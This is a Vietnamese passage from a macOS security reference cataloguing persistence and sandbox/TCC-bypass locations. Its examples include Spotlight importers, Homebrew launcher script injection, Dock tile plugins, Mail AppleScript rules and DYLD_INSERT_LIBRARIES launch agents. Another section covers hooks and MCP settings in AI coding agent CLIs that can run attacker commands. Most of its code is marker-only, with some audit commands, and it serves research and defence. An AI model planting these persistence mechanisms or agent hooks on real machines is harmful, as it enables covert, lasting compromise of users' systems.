- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Sandbox có vẻ rất hạn chế

#### Vị trí

- `~/Library/Spotlight/`
  - **Kích hoạt**: Một tệp mới có phần mở rộng do plugin Spotlight quản lý được tạo.
- `/Library/Spotlight/`
  - **Kích hoạt**: Một tệp mới có phần mở rộng do plugin Spotlight quản lý được tạo.
  - Cần quyền root
- `/System/Library/Spotlight/`
  - **Kích hoạt**: Một tệp mới có phần mở rộng do plugin Spotlight quản lý được tạo.
  - Cần quyền root
- `Some.app/Contents/Library/Spotlight/`
  - **Kích hoạt**: Một tệp mới có phần mở rộng do plugin Spotlight quản lý được tạo.
  - Cần ứng dụng mới

#### Mô tả & Khai thác

Spotlight là tính năng tìm kiếm tích hợp sẵn của macOS, được thiết kế để cung cấp cho người dùng **quyền truy cập nhanh chóng và toàn diện vào dữ liệu trên máy tính**.\
Để hỗ trợ khả năng tìm kiếm nhanh này, Spotlight duy trì một **cơ sở dữ liệu độc quyền** và tạo chỉ mục bằng cách **phân tích hầu hết các tệp**, cho phép tìm kiếm nhanh cả tên tệp lẫn nội dung của chúng.<sup>[[25]](#references)</sup>

Cơ chế bên dưới của Spotlight gồm một tiến trình trung tâm tên là 'mds', viết tắt của **'metadata server'.** Tiến trình này điều phối toàn bộ dịch vụ Spotlight. Ngoài ra còn có nhiều daemon 'mdworker' thực hiện các tác vụ bảo trì khác nhau, chẳng hạn như lập chỉ mục các loại tệp khác nhau (`ps -ef | grep mdworker`). Các tác vụ này được thực hiện nhờ plugin Spotlight importer, hay **".mdimporter bundles**", giúp Spotlight nhận diện và lập chỉ mục nội dung ở nhiều định dạng tệp khác nhau.

Các plugin hoặc bundle **`.mdimporter`** nằm ở những vị trí đã nêu trước đó. Một bundle mới phải được phát hiện và khớp với một loại tệp, đồng thời Spotlight phải thực sự lập chỉ mục một tệp phù hợp; chỉ sao chép bundle không chứng minh rằng nó đã được tải. [Tài liệu tham khảo MDImporter của Apple](https://developer.apple.com/documentation/coreservices/file_metadata/mdimporter) liên kết việc tải với một tệp đủ điều kiện đã thay đổi. Việc thực thi Spotlight importer trên macOS 26 chưa được kiểm tra ở đây.

Có thể **tìm tất cả `mdimporters`** đã được tải bằng cách chạy:

```bash
mdimport -L
Paths: id(501) (
    "/System/Library/Spotlight/iWork.mdimporter",
    "/System/Library/Spotlight/iPhoto.mdimporter",
    "/System/Library/Spotlight/PDF.mdimporter",
    [...]
```

Và ví dụ, **/Library/Spotlight/iBooksAuthor.mdimporter** được dùng để phân tích cú pháp các loại tệp này (các phần mở rộng `.iba` và `.book`, cùng những phần mở rộng khác):

```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
    0 => {
      "CFBundleTypeName" => "iBooks Author Book"
      "CFBundleTypeRole" => "MDImporter"
      "LSItemContentTypes" => [
        0 => "com.apple.ibooksauthor.book"
        1 => "com.apple.ibooksauthor.pkgbook"
        2 => "com.apple.ibooksauthor.template"
        3 => "com.apple.ibooksauthor.pkgtemplate"
      ]
      "LSTypeIsPackage" => 0
    }
  ]
[...]
 => {
      "UTTypeConformsTo" => [
        0 => "public.data"
        1 => "public.composite-content"
      ]
      "UTTypeDescription" => "iBooks Author Book"
      "UTTypeIdentifier" => "com.apple.ibooksauthor.book"
      "UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
      "UTTypeTagSpecification" => {
        "public.filename-extension" => [
          0 => "iba"
          1 => "book"
        ]
      }
    }
[...]
```

> [!CAUTION]
> Nếu kiểm tra Plist của các `mdimporter` khác, bạn có thể không tìm thấy mục **`UTTypeConformsTo`**. Đó là vì đây là một _Uniform Type Identifier_ tích hợp sẵn ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) và không cần chỉ định phần mở rộng.
>
> Ngoài ra, các plugin mặc định của hệ thống luôn được ưu tiên, vì vậy kẻ tấn công chỉ có thể truy cập những tệp mà các `mdimporter` của Apple không lập chỉ mục.

Để tạo importer của riêng mình, bạn có thể bắt đầu với dự án này: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer), sau đó đổi tên, chỉnh sửa **`CFBundleDocumentTypes`** và thêm **`UTImportedTypeDeclarations`** để hỗ trợ phần mở rộng mong muốn, đồng thời phản ánh chúng trong **`schema.xml`**.\
Sau đó **thay đổi** mã của hàm **`GetMetadataForFile`** để thực thi payload khi tạo một tệp có phần mở rộng được xử lý.

Cuối cùng, **build và sao chép `.mdimporter` mới** vào một trong ba vị trí nêu trên. Bạn có thể kiểm tra xem nó đã được tải hay chưa bằng cách **theo dõi log** hoặc chạy **`mdimport -L`**.

> [!TIP]
> Dù sandbox của importer rất hạn chế, `mdworker` lập chỉ mục tệp bằng **quyền đọc đặc quyền**. Vì vậy, `.mdimporter` độc hại có thể đọc *nội dung* của tệp trong các vị trí được TCC bảo vệ (Downloads, Pictures, Desktop, …) và tuồn metadata thu thập được ra ngoài mà không cần bất kỳ lời nhắc TCC nào — đây là **lỗ hổng vượt qua TCC "Sploitlight" (CVE-2025-31199)**, đã được vá trong macOS Sequoia 15.4.<sup>[[55]](#references)</sup>

Để biết kỹ thuật riêng biệt trên macOS 26, sử dụng **tên Darwin notification** thay vì system log để mang dữ liệu được bảo vệ, xem [Spotlight importer leakage via Darwin notification names](macos-security-and-privilege-escalation/macos-security-protections/macos-tcc/macos-tcc-bypasses/#spotlight-importer-leakage-via-darwin-notification-names).<sup>[[57]](#references)</sup>

### ~~Ngăn tùy chọn~~

> [!CAUTION]
> Có vẻ như cách này không còn hoạt động.

Bài viết: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)<sup>[[26]](#references)</sup>

- Hữu ích để vượt qua sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Cần một thao tác cụ thể của người dùng
- Vượt qua TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Vị trí

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Mô tả

Có vẻ như cách này không còn hoạt động.<sup>[[26]](#references)</sup>

### Tệp script của ứng dụng

Bài viết: [https://theevilbit.github.io/beyond/beyond_0010/](https://theevilbit.github.io/beyond/beyond_0010/)<sup>[[37]](#references)</sup>

- Hữu ích để vượt qua sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Nhưng ứng dụng mục tiêu phải được cài đặt và được nạn nhân chạy/sử dụng
- Vượt qua TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Vị trí

Một **script được thông dịch mà ứng dụng hoặc công cụ đã cài đặt thực sự thực thi** và tác nhân có thể sửa đổi. Hãy xác nhận quyền của tệp và đường dẫn gọi; chỉ tìm thấy tệp `.sh` hoặc `.py` là chưa đủ. [Hướng dẫn ký mã](https://developer.apple.com/library/archive/documentation/Security/Conceptual/CodeSigningGuide/Procedures/Procedures.html) của Apple nêu rằng các app bundle đã ký sẽ niêm phong tài nguyên, bao gồm cả script. Chỉnh sửa script bên trong bundle sẽ làm hỏng niêm phong đó và có thể bị phát hiện hoặc chặn khi bundle được xác thực. Script bên ngoài, chẳng hạn launcher của Homebrew, có cách xử lý chữ ký và độ tin cậy khác. Các ví dụ lịch sử trong bài viết bao gồm:

- **`/Applications/Sublime Text.app/Contents/MacOS/sublime.py`** – script được các bản Sublime Text cũ sử dụng; cần kiểm tra sự tồn tại của tệp và cách nó được chạy lúc khởi động trên phiên bản đã cài đặt. Tệp này không có trên máy Mac thử nghiệm.
- **`/opt/homebrew/bin/brew`** (Apple Silicon) hoặc **`/usr/local/bin/brew`** (Intel) – launcher Bash được thực thi khi gọi đường dẫn `brew` đó, nếu đã cài đặt và tác nhân có quyền ghi. `/opt/homebrew/bin/brew` là script Bash có thể ghi trên máy Mac thử nghiệm; đây là quan sát tại máy đó, không phải quy tắc phân quyền chung của Homebrew.
- **`idlemain.py`** của IDLE bên trong app bundle Python – có thể cần quyền admin để ghi, nhưng chạy với danh tính của người dùng IDLE.
- **`/Library/Application Support/Wireshark/ChmodBPF/ChmodBPF`** – script shell lịch sử chạy với quyền root khi tác vụ launchd tương ứng `org.wireshark.ChmodBPF` được cài đặt. Script và tác vụ này không có trên máy Mac thử nghiệm.

#### Mô tả & Khai thác

Một số công cụ và ứng dụng thực thi script được thông dịch trong lúc chạy. Script có thể ghi sẽ thực thi các lệnh được thêm vào khi bên gọi cụ thể chạy lần tiếp theo, miễn là quá trình xác thực chữ ký, quarantine và các bước kiểm tra khác cho phép. Nghiên cứu ban đầu đã minh họa một số bản cài đặt năm 2019; hãy kiểm tra lại đường dẫn và cơ chế kích hoạt trên phiên bản mục tiêu.<sup>[[37]](#references)</sup>

```python
# Marker-only injection test on a COPY of Homebrew's launcher. The relocated
# copy may fail its normal Homebrew logic; the marker checks script execution.
import pathlib, subprocess, tempfile

source = pathlib.Path('/opt/homebrew/bin/brew')
with tempfile.TemporaryDirectory(prefix='ht-script-copy-') as root:
    target = pathlib.Path(root) / 'brew'
    marker = pathlib.Path(root) / 'ran'
    lines = source.read_text().splitlines(keepends=True)
    target.write_text(lines[0] + '/usr/bin/touch ' + str(marker) + '\n' + ''.join(lines[1:]))
    target.chmod(0o700)
    subprocess.run([str(target), '--version'], capture_output=True, timeout=15)
    print('marker fired:', marker.exists())
```

This copy test tạo ra kết quả `marker fired: True` trên macOS 26.5.2; launcher gốc không bị đụng đến. Điều này chứng minh điểm chèn được thực thi trong bản sao, chứ không chứng minh rằng app bundle đã ký bị chỉnh sửa hoặc bản cài đặt Homebrew thực tế sẽ vượt qua mọi bước kiểm tra khi khởi chạy.

### Dock Tile Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0032/](https://theevilbit.github.io/beyond/beyond_0032/)<sup>[[38]](#references)</sup>

- Hữu ích để bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Cần có một app khai báo plugin để Dock tìm thấy/đăng ký và xử lý plugin đó
  - Plugin được tải vào một helper **do Apple ký**, không có entitlement app-sandbox và đã tắt library validation. Nghiên cứu được trích dẫn không cho thấy helper này trong giao diện Background Task Management; cần kiểm tra khả năng hiển thị trên phiên bản mục tiêu.
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Vị trí

- **`<App>.app/Contents/PlugIns/<name>.docktileplugin`**, được tham chiếu bằng khóa **`NSDockTilePlugIn`** trong `Info.plist` của app; `Info.plist` riêng của plugin đặt **`NSPrincipalClass`**.

#### Mô tả & Exploitation

Khi một app khai báo `NSDockTilePlugIn`, Dock có thể tải bundle được tham chiếu vào XPC helper **`com.apple.dock.external.extra`** (`...extra.arm64` trên Apple Silicon) khi đăng nhập hoặc khi tile của app được thêm vào; bản thân app không cần khởi chạy. App cần được macOS tìm thấy/đăng ký và chấp nhận. Helper này **do Apple ký**, không có entitlement `com.apple.security.app-sandbox` và có `com.apple.security.cs.disable-library-validation`. Phương thức **`setDockTile:`** của principal class được gọi khi tải; từ đó, phương thức này có thể đăng ký nhận distributed notifications (ví dụ: `com.apple.screenIsLocked`) để xử lý các sự kiện về sau.<sup>[[38]](#references)</sup>

Trên macOS 26.5.2, quá trình kiểm tra chỉ đọc bằng `codesign` xác nhận chữ ký Apple và các entitlement của helper; một số app đã cài đặt cũng khai báo `NSDockTilePlugIn`. Không có plugin mới nào được cài đặt hoặc tải trên máy Mac đó, vì vậy việc thực thi một bundle mới được tạo trên phiên bản này vẫn chưa được kiểm thử.

```bash
# Enumerate apps already shipping a Dock tile plugin (hijack / template targets)
for a in /Applications/*.app /System/Applications/*.app; do
  v=$(/usr/libexec/PlistBuddy -c 'Print :NSDockTilePlugIn' "$a/Contents/Info.plist" 2>/dev/null) \
    && echo "$a -> $v"
done
# e.g. on macOS 26: Calendar.app, App Store.app, System Settings.app, plus 3rd-party Warp.app / ChatGPT.app
```

```objc
// Principal class, built as MyPlugin.docktileplugin, placed in <App>.app/Contents/PlugIns/
// App Info.plist:    NSDockTilePlugIn = MyPlugin.docktileplugin
// Plugin Info.plist: NSPrincipalClass = MyDockPlugin , CFBundlePackageType = BNDL
@interface MyDockPlugin : NSObject <NSDockTilePlugIn>
@end
@implementation MyDockPlugin
- (void)setDockTile:(NSDockTile *)dockTile {
    system("touch /tmp/hacktricks_docktile");   // runs when the tile is added to the Dock / at login
}
@end
```

### Widgets (Notification Center / WidgetKit)

Bài viết: [https://theevilbit.github.io/beyond/beyond_0033/](https://theevilbit.github.io/beyond/beyond_0033/)<sup>[[39]](#references)</sup>

- Hữu ích để bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Widget extension chạy trong **process riêng**, và việc thêm một widget **không** làm xuất hiện cảnh báo Background Task Management
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Config plist nằm trong container được TCC bảo vệ, vì vậy việc chỉnh sửa từ bên ngoài cần Full Disk Access hoặc TCC bypass

#### Vị trí

- Bundle của widget extension: **`<App>.app/Contents/PlugIns/<Widget>.appex`**
- Các widget đang hoạt động/đã đăng ký: **`~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist`** (các key `widgets.instances` và `widgets.widgets`)

#### Mô tả & Khai thác

WidgetKit extension được đóng gói bên trong một ứng dụng sẽ chạy trong **process riêng** do Notification Center quản lý. Đăng ký một instance trong `widgets.instances` (blob `CHSWidget` được mã hóa bằng base64 `NSKeyedArchiver`, có dữ liệu `INIntent` nhúng bên trong) rồi khởi động lại NotificationCenter sẽ khiến widget được tải và thực thi mã `TimelineProvider`/intent.<sup>[[39]](#references)</sup>

```bash
# Inspect currently-registered widgets (file present on stock macOS)
plutil -p ~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist \
  | grep -iE "widgets?\." | head
```

### Quy tắc Mail.app (Chạy AppleScript)

Bài viết: [https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)<sup>[[42]](#references)</sup>

- Hữu ích để vượt sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Nhưng Mail.app phải được cấu hình tài khoản và đang chạy; email đến là trigger
- Vượt TCC: [🔴](https://emojipedia.org/large-red-circle)
  - Chỉnh sửa các quy tắc/script từ bên ngoài Mail có thể yêu cầu đóng Mail và cấp Full Disk Access trên các phiên bản macOS hiện đại

#### Vị trí

- **`~/Library/Mail/V10/MailData/SyncedRules.plist`** (quy tắc cục bộ; `V10` trên Sonoma/Sequoia, `V11`+ trên các phiên bản mới hơn)
- **`~/Library/Mobile Documents/com~apple~mail/Data/V10/MailData/ubiquitous_SyncedRules.plist`** (quy tắc được đồng bộ với iCloud, được ưu tiên)
- Trạng thái bật quy tắc: **`RulesActiveState.plist`**; payload AppleScript: **`~/Library/Application Scripts/com.apple.mail/*.scpt`**

#### Mô tả & Khai thác

Một **quy tắc** trong Apple Mail có thể có hành động *"Chạy AppleScript"*. Bằng cách thêm một quy tắc khớp với **dòng tiêu đề** được tạo riêng và chạy script của kẻ tấn công, đối phương có thể thực thi mã **từ xa theo trigger và một cách bí mật** trong ngữ cảnh của Mail mỗi khi email đặc biệt đó đến — đây là một vector né được nhiều trình quét persistence vì không tạo LaunchAgent/Login Item.<sup>[[42]](#references)</sup> Đặt quy tắc để **xóa** cả email trigger sẽ che giấu dấu vết. Người phòng thủ có thể trực tiếp tìm kiếm quy tắc này:<sup>[[43]](#references)</sup>

```bash
# Enumerate Mail rules that invoke AppleScript
grep -A1 -i "AppleScript" ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null
plutil -p ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null | grep -iE "AppleScript|ShouldTransfer|Delete"
```

### Configuration Profiles (.mobileconfig)

Bài viết: [https://www.jamf.com/blog/malicious-profiles-come/](https://www.jamf.com/blog/malicious-profiles-come/)<sup>[[44]](#references)</sup>

- Hữu ích để bypass sandbox: [🔴](https://emojipedia.org/large-red-circle)
  - macOS hiện đại yêu cầu **người dùng phê duyệt thủ công** trong System Settings → *Device Management* (không còn cài đặt `profiles install` âm thầm nếu không dùng MDM)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Vị trí

- Các profile đã cài đặt nằm trong **`/Library/Managed Preferences/`** và **`/var/db/ConfigurationProfiles/`**; profile là một XML plist có mảng `PayloadContent`.

#### Mô tả & Khai thác

`.mobileconfig` không phải là primitive thực thi mã trực tiếp, nhưng có thể lưu cấu hình như **CA gốc đáng tin cậy** (`com.apple.security.root`), **proxy toàn cục hoặc PAC** (`com.apple.proxy.*`), **managed preferences** (`com.apple.ManagedClient.preferences`) hoặc các hạn chế. Trên macOS 10.15 trở lên, định nghĩa [`PayloadRemovalDisallowed` của Apple](https://developer.apple.com/documentation/devicemanagement/toplevel) cho biết việc đặt giá trị này thành `true` trên profile **được cài đặt thủ công** mà không có payload mật khẩu gỡ bỏ sẽ yêu cầu **xác thực quản trị viên** để gỡ profile; điều này không khiến profile đó tuyệt đối không thể gỡ bỏ. Profile được cài đặt bằng MDM có các quy tắc quản lý và gỡ bỏ riêng.<sup>[[44]](#references)</sup>

> [!WARNING]
> Profile cấu hình thông thường **không có loại payload nào có thể thả một `LaunchDaemon`/`LaunchAgent` tùy ý**. Để cài đặt daemon theo cách đó cần **đăng ký MDM đầy đủ** cùng với agent/script quản lý — đừng coi `.mobileconfig` là cơ chế phân phối launchd.

```bash
# Inspect installed profiles (user context)
profiles list            # per-user
sudo profiles show       # system (root)
```

### DYLD_INSERT_LIBRARIES Persistence

- Hữu ích để bypass sandbox: [🔴](https://emojipedia.org/large-red-circle)
  - dyld **loại bỏ** `DYLD_*` đối với các binary SIP/platform, ứng dụng hardened-runtime và mục tiêu setuid, nên chỉ inject vào các process không được bảo vệ và **không** bypass SIP/hardened runtime
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Vị trí

- Cách đáng tin cậy: dict **`EnvironmentVariables`** bên trong plist `LaunchAgent`/`LaunchDaemon` độc hại (chạy khi đăng nhập/khởi động)
- Không còn hoạt động/lỗi thời (chỉ báo cáo): **`~/.MacOSX/environment.plist`** (bị xóa từ 10.8) và **`/etc/launchd.conf`** (bị xóa từ 10.10)

#### Mô tả & Khai thác

Nếu attacker có thể đưa `DYLD_INSERT_LIBRARIES` vào môi trường của process nạn nhân, dyld sẽ tải dylib của attacker (constructor của nó sẽ chạy) vào process đó. Biến thể persistence nhúng biến này trong một LaunchAgent để mỗi lần job được khởi chạy, nó sẽ inject lại. Lưu ý rằng `launchctl setenv DYLD_*` bị lọc trên các phiên bản macOS hiện đại, vì vậy hãy nhúng biến này vào plist.<sup>[[45]](#references)</sup>

```xml
<key>EnvironmentVariables</key>
<dict>
    <key>DYLD_INSERT_LIBRARIES</key>
    <string>/tmp/evil.dylib</string>
</dict>
```

Để xem đầy đủ cơ chế dylib injection/hijacking, hãy xem:

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

### CLI của AI Coding Agent (hooks, MCP servers, rules files)

Bài phân tích: [CVE-2025-59536 (Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)<sup>[[47]](#references)</sup>, [Backdoor trong Rules File (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)<sup>[[48]](#references)</sup>

- Hữu ích để bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Yêu cầu developer sử dụng agent tương ứng. Khi agent chấp nhận cấu hình, các lệnh khởi động chạy với quyền của người dùng đó; mức độ tin cậy của workspace và việc phê duyệt MCP tùy thuộc vào sản phẩm và chế độ phiên.
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle) (chạy với tư cách người dùng; kế thừa mọi quyền mà terminal/agent hiện có)

#### Vị trí

Các file cấu hình hook và MCP tường minh có thể khiến **lệnh shell hoặc tiến trình con chạy khi developer sử dụng công cụ** — thông qua file toàn cục theo từng người dùng (persistence) hoặc file được commit trong repo (supply-chain). `CLAUDE.md`, `AGENTS.md`, `GEMINI.md` và các quy tắc của editor là **chỉ dẫn dành cho agent**, không đảm bảo sẽ thực thi shell khi được đọc; tác động của chúng phụ thuộc vào hành vi của agent và quyền sử dụng công cụ. Hãy kiểm tra các quy tắc tin cậy và phê duyệt hiện hành của từng sản phẩm.

- **Claude Code**
  - `~/.claude/settings.json`, `.claude/settings.json` của project, `.claude/settings.local.json` và file **`/Library/Application Support/ClaudeCode/managed-settings.json` chỉ dành cho root** (cấu hình MDM/managed **không thể bị người dùng ghi đè** → persistence mạnh)
  - Đối tượng `hooks` — các sự kiện `PreToolUse`, `PostToolUse`, `UserPromptSubmit`, `Stop`, `SubagentStop`, `SessionStart`, `SessionEnd`, `Notification`, `PreCompact` — mỗi sự kiện chạy một lệnh shell `command`
  - `statusLine.command` — lệnh shell được thực thi để hiển thị status line (mỗi phiên)
  - MCP servers trong `~/.claude.json` / `.mcp.json` của project — `command`+`args` được khởi chạy dưới dạng tiến trình con
  - `CLAUDE.md` / `~/.claude/CLAUDE.md` — chỉ dẫn có thể tìm cách prompt injection, tùy thuộc vào hành vi của agent và quyền sử dụng công cụ
- **OpenAI Codex CLI**: `~/.codex/config.toml` `[mcp_servers.*]` (`command`/`args` được khởi chạy dưới dạng tiến trình con); chỉ dẫn project trong `AGENTS.md`
- **Gemini CLI**: `~/.gemini/settings.json` (`hooks`, MCP servers); `GEMINI.md`
- **Cursor**: `~/.cursor/hooks.json` (`beforeShellExecution`, `afterAgentResponse`, `stop`, … chạy lệnh); `.cursor/rules/`, `.cursorrules`, `~/.cursor/mcp.json`; GitHub Copilot `.github/copilot-instructions.md`

#### Mô tả & Khai thác

Nếu một tác nhân có thể chỉnh sửa cài đặt toàn cục của tài khoản người dùng, các lệnh hook hoặc MCP trong đó có thể chạy ở những phiên tiếp theo dưới tài khoản đó. Cấu hình do repository kiểm soát là trường hợp riêng: [tài liệu bảo mật Claude Code hiện hành](https://code.claude.com/docs/en/security) mô tả hộp thoại tương tác để xác nhận độ tin cậy của workspace và một lời nhắc phê duyệt riêng cho các server trong `.mcp.json` của project. [Ma trận quyền của Claude Code](https://code.claude.com/docs/en/permissions#what-runs-before-you-trust-a-folder) cho biết hooks có thể chạy sau khi thư mục cha được xác nhận là đáng tin cậy; các phiên `claude -p`/SDK không hiển thị lời nhắc xác nhận tương tác. Trong những chế độ không tương tác này, các MCP server của project kết nối mà không cần lời nhắc phê duyệt. Lỗ hổng bypass hook của project trước khi xác nhận độ tin cậy, được báo cáo là CVE-2025-59536, đã được [khắc phục vào năm 2025](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/); đừng xem đây là hành vi mặc định hiện tại. Các phương thức phát tán có thể bao gồm repository bị xâm nhập hoặc trình cài đặt độc hại. Prompt injection qua rules file kém tất định hơn hook tường minh và vẫn phụ thuộc vào việc phê duyệt công cụ.<sup>[[47]](#references)</sup><sup>[[48]](#references)</sup>

Ví dụ về cài đặt Claude Code toàn cục của người dùng; chỉ đặt cấu hình này trong một tài khoản dùng để thử nghiệm rồi xóa bỏ:

```json
{
  "hooks": {
    "SessionStart": [
      { "hooks": [ { "type": "command", "command": "touch /tmp/hacktricks_claude_hook" } ] }
    ]
  },
  "statusLine": { "type": "command", "command": "touch /tmp/hacktricks_statusline; echo HT" }
}
```

Ví dụ về cấu hình Codex MCP toàn cục cho người dùng:

```toml
[mcp_servers.evil]
command = "/bin/sh"
args = ["-c", "touch /tmp/hacktricks_codex_mcp; exec real-mcp-server"]
```

Ví dụ cấu hình hook của Cursor; hãy kiểm tra schema của phiên bản đã cài đặt trước khi sử dụng:

```json
{ "version": 1, "hooks": { "beforeShellExecution": [ { "command": "touch /tmp/hacktricks_cursor_hook" } ] } }
```

```bash
# Defensive audit: which agent configs can auto-run commands?
ls -la .claude/settings*.json .mcp.json ~/.claude/settings.json ~/.claude.json \
       ~/.codex/config.toml ~/.gemini/settings.json ~/.cursor/hooks.json \
       ~/.cursor/mcp.json .cursor/rules .cursorrules .github/copilot-instructions.md 2>/dev/null
python3 -c 'import json;d=json.load(open("'"$HOME"'/.claude/settings.json"));print("claude hooks:",list(d.get("hooks",{}).keys()),"statusLine:",bool(d.get("statusLine")))' 2>/dev/null
```

### Tiện ích trình duyệt (Chromium: Chrome / Brave / Edge)

Bài viết: [Chrome external extensions](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)<sup>[[49]](#references)</sup>, [Lạm dụng ExtensionInstallForcelist trên macOS](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)<sup>[[50]](#references)</sup>

- Hữu ích để bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Yêu cầu trình duyệt được hỗ trợ và tiện ích đã cài đặt, bật. External Extensions trên macOS yêu cầu người dùng xác nhận; force-install được quản lý yêu cầu có enterprise policy phù hợp.
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

> [!NOTE]
> Cơ chế này khác với **native messaging hosts** (xem phần *Chrome native messaging hosts* ở trên). Ở đây, cơ chế duy trì hiện diện là chính **tiện ích được tự động cài đặt**.

#### Vị trí

- **External Extensions JSON** (được phát hiện khi trình duyệt khởi động, sau đó sẽ yêu cầu bật trên macOS):
  - Chrome: `~/Library/Application Support/Google/Chrome/External Extensions/<extID>.json` (mỗi người dùng) hoặc `/Library/Application Support/Google/Chrome/External Extensions/` (tất cả người dùng)
  - Brave: `~/Library/Application Support/BraveSoftware/Brave-Browser/External Extensions/`
  - Edge: `~/Library/Application Support/Microsoft Edge/External Extensions/`
- **Force-install bằng enterprise policy** thông qua managed preferences / configuration profile:
  - Khóa `ExtensionInstallForcelist` của `com.google.Chrome` (`com.brave.Browser` với Brave, `com.microsoft.Edge` với Edge), được đọc từ `/Library/Managed Preferences/` hoặc một tệp `.mobileconfig` đã cài đặt

#### Mô tả & Khai thác

Đây là hai cách cài đặt khác nhau. [Tài liệu về external-install](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions) của Chrome nêu rõ **người dùng Windows và macOS phải xác nhận và bật** tiện ích được cung cấp qua tệp *External Extensions*; tiện ích không tự chạy chỉ vì tệp JSON đó được ghi vào. Để cài đặt cho tất cả người dùng trên macOS, Chrome cũng yêu cầu tệp external-extension không bị sửa đổi bởi người dùng không có đặc quyền. Policy `ExtensionInstallForcelist` hoặc `ExtensionSettings` được quản lý có thể cài đặt và ghim tiện ích mà không cần người dùng tương tác; [hướng dẫn policy cho Mac của Google](https://support.google.com/chrome/a/answer/7517624) mô tả cấu hình được quản lý và cho biết người dùng không thể gỡ các tiện ích được force-install. Đây là phương thức triển khai policy, không phải lối tắt `defaults write` cho từng người dùng.<sup>[[49]](#references)</sup>

> [!WARNING]
> Trên macOS, manifest JSON *External Extensions* phải trỏ đến URL cập nhật của **Chrome Web Store**, không phải CRX cục bộ. Triển khai bằng managed policy có các điều kiện tiên quyết riêng dành cho doanh nghiệp và có thể cho phép URL cập nhật tự lưu trữ được quản lý. Đối với tiện ích unpacked cục bộ trong hồ sơ thử nghiệm, công tắc `--load-extension=/path` của developer mode trong Chrome là một cơ chế riêng, không khiến tệp External Extensions JSON tự thực thi. Không xem việc ghi vào `Secure Preferences` là tương đương với một trong hai phương thức đăng ký được tài liệu hóa.

```bash
# In a disposable browser account, propose a Chrome Web Store extension for enablement
ext_id='replace_with_32_character_web_store_id'
external_dir="$HOME/Library/Application Support/Google/Chrome/External Extensions"
mkdir -p "$external_dir"
cat > "$external_dir/$ext_id.json" <<'JSON'
{ "external_update_url": "https://clients2.google.com/service/update2/crx" }
JSON
```

Khởi chạy Chrome trong tài khoản dùng một lần đó và quan sát lời nhắc bật tiện ích; hành vi của chính tiện ích là PoC thực thi sau khi người dùng chấp nhận. Sau khi kiểm thử, hãy xóa manifest và tắt/gỡ cài đặt tiện ích trong profile đó. Đường dẫn này **không** được thử nghiệm trên profile Chrome đang hoạt động trên máy Mac nghiên cứu. Tuyến managed-policy cũng không được triển khai ở đó.

Force-install và External Extensions tham chiếu đến ID tiện ích **Chrome Web Store**; để xem thủ thuật cấp thấp hơn nhằm âm thầm chèn một tiện ích cục bộ bằng cách chỉnh sửa `Secure Preferences` được ký HMAC của profile, cùng các hành vi lạm dụng tiến trình Chromium khác, xem:

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md
{{#endref}}

### Trình xử lý URL Scheme & Loại tệp (LaunchServices)

Bài viết: [Khai thác Mac từ xa qua URL Scheme tùy chỉnh (Objective-See)](https://objective-see.org/blog/blog_0x38.html)<sup>[[52]](#references)</sup>

- Hữu ích để vượt qua sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Tác nhân kích hoạt là nạn nhân nhấp vào liên kết (ví dụ: trong Chrome/Brave/Safari) hoặc mở một tệp thuộc loại đã đăng ký
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Vị trí

- `Info.plist` của app bundle khai báo **`CFBundleURLTypes`/`CFBundleURLSchemes`** (URL scheme tùy chỉnh) hoặc **`CFBundleDocumentTypes`** (phần mở rộng tệp/UTI)
- Các giá trị mặc định hiệu lực theo từng người dùng có thể xuất hiện trong **`~/Library/Preferences/com.apple.LaunchServices/com.apple.launchservices.secure.plist`** (mảng `LSHandlers`). API được Apple hỗ trợ để chọn URL-scheme mặc định là `LSSetDefaultHandlerForURLScheme`; ghi trực tiếp vào plist đó không phải là phương thức đăng ký hoặc cập nhật cache được tài liệu hóa.

#### Mô tả & Khai thác

